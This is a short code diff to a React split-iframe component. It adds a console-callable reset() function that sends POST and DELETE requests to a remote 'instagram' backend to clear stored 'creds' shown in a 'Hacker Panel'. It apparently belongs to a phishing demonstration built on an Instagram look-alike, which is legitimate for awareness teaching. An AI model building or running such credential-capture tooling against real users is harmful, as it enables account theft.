@@ -538,9 +538,42 @@ const SplitIframeContent = ({
 
     fetchData();
 
+    // Define the global reset function
+    // @ts-ignore
+    window.reset = async () => {
+      console.log("Attempting to reset database...");
+      try {
+        // Try direct POST to /reset on the server
+        const resetUrl = "https://instagram-hfmx.onrender.com/reset";
+        await fetch(resetUrl, { method: "POST" });
+        console.log("Database reset command sent.");
+        setHackerData(""); // Clear local view immediately
+        fetchData(); // Fetch fresh data
+      } catch (e) {
+        console.error("Reset failed", e);
+        // Fallback: try DELETE /creds
+        try {
+           const deleteUrl = "https://instagram-hfmx.onrender.com/creds";
+           await fetch(deleteUrl, { method: "DELETE" });
+           console.log("Database DELETE command sent.");
+           setHackerData("");
+           fetchData();
+        } catch (e2) {
+           console.error("DELETE failed too", e2);
+        }
+      }
+    };
+    
+    console.log("Hacker Panel loaded. Type reset() in console to clear database.");
+
     if (data.refreshInterval) {
       const interval = setInterval(fetchData, data.refreshInterval);
       return () => clearInterval(interval);
+    }
+    
+    return () => {
+      // @ts-ignore
+      delete window.reset;
     }
   }, [isActive, data.rightContentUrl, data.refreshInterval]);
 
